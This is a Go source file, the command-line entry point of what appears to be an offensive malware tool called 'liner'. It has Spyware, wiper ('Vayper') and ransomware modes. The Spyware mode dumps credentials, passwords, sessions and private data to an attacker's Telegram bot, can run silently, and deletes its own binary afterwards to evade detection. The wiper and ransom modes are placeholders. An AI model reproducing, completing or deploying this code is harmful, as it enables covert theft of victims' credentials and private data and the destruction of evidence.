package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/Nowafen/liner/core"
)

func main() {
	// Define CLI flags
	mode := flag.String("mode", "", "Operation mode (Spyware, Vayper, Ransom)")
	dump := flag.String("dump", "", "Data to dump (Credentials, Password, Session, privateDATA, all)")
	token := flag.String("token", "", "Telegram bot token")
	chatID := flag.String("id", "", "Telegram chat ID")
	silent := flag.Bool("silent", false, "Run in silent mode (no output)")
	flag.Parse()

	// Check if only help flag is provided
	if flag.Lookup("h") != nil && len(os.Args) == 2 && (os.Args[1] == "-h" || os.Args[1] == "--help") {
		flag.Usage()
		os.Exit(0)
	}

	// Validate flag prefix (force -- instead of -)
	for _, arg := range os.Args[1:] {
		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && arg != "-h" {
			fmt.Println("Error: Flags must use -- prefix (e.g., --dump instead of -dump)")
			flag.Usage()
			os.Exit(1)
		}
	}

	// Validate required flags
	if *mode == "" || *token == "" || *chatID == "" {
		fmt.Println("Error: --mode, --token, and --id are required")
		flag.Usage()
		os.Exit(1)
	}

	// Handle modes
	switch *mode {
	case "Spyware":
		if *dump == "" {
			fmt.Println("Error: --dump is required for Spyware mode")
			os.Exit(1)
		}
		// Run Spyware operation directly
		err := core.Spyware(*dump, *token, *chatID, *silent)
		if err != nil {
			if !*silent {
				fmt.Printf("Error running Spyware: %v\n", err)
			}
			os.Exit(1)
		}
		if !*silent {
			fmt.Println("Spyware operation completed successfully")
		}
		// Self-delete after successful operation
		os.Remove(os.Args[0])
	case "Vayper":
		fmt.Println("Vayper mode is not yet fully implemented")
		os.Exit(1)
	case "Ransom":
		fmt.Println("Ransom mode is not yet fully implemented")
		os.Exit(1)
	default:
		fmt.Println("Invalid mode. Use: Spyware, Vayper, or Ransom")
		os.Exit(1)
	}
}
